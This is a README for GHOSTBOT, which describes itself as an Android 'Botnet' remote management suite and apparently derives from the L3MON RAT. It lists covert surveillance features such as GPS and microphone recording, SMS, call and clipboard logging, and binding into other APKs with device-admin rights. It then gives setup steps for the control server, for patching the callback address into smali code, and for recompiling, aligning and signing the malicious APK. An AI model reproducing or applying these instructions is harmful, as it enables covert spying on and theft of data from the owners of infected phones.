<p align="center">
<img src="https://github.com/Ba-hub/GHOSTBOT/raw/master/assets/webpublic/logo.png" height="60"><br>
A cloud based remote android managment suite(Botnet), powered by NodeJS
</p>



## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder
- Easily Bind with Another Apk
- Enable Device Admin Apk 
- Enable all permission in run time 

## Prerequisites 
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server

## Installation 
1. Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that dont use this will be closed WITHOUT a response)
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-8-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`


4. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run GHOSTBOT on startup

5. Set a Username & Password
    1. Stop GHOSTBOT `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

6. in your browser navigate to `http://<SERVER IP>:22533`

### Manually Apk Build by ApkEditor:
```


Go to com/etechd/l3mon/IOSocket.smali Go line No 77 add
Listening address as "http://webaddress?model=" Save Recompile & Signed.



```

### For Apktool recompiler :

```

$/> sudo apt-get install apktool

Go To /app/factory folder unzip the ghostbot-apktool-compiler, commands below 

$/> apktool b ghostbot-apktool-compiler -o GHOSTBOT.apk 

```

### Sign & Zipalign Apk 
``` 

$/> sudo apt-get install apksigner
$/> sudo apt-get install zipalign 

#~ Generate Key

 

$/> keytool -genkey -v -keystore my.keystore -keyalg RSA -keysize 2048 -validity 10000 -alias

app

 



#~ align apk 

 

$/> zipalign -p 4 GHOSTBOT.apk Aligned-Ghostbot.apk

 

 

#~ Verify aligned apk 

 

$/> zipalign -c 4 Aligned-Ghostbot.apk

 

 

#~ Sign by generated key

 

$/> jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my.keystore 

Aligned-Ghostbot.apk my_alias_name 

 

 

#~ verify signature 

 

$/> jarsigner -verify -verbose Aligned-Ghostbot.apk


```
    
    

<br>
<p align="center">Made with 💀 By <a href="http://iconicbabay.medianewsonline.com">Ghosthub</a></p>
<p align="center" style="font-size: 8px">v0.1.3</p>
